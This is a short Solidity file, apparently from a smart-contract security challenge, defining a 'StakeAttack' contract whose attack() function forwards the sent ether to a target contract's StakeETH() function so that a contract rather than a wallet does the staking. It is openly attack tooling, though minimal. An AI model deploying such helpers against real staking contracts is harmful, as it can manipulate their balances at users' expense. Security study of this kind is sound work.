// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IStake {
    function StakeETH() external payable;
}

contract StakeAttack {
    function attack(address _targetAddress) public payable {
        IStake _stake;
        _stake = IStake(_targetAddress);
        _stake.StakeETH{value: msg.value}();
    }
}
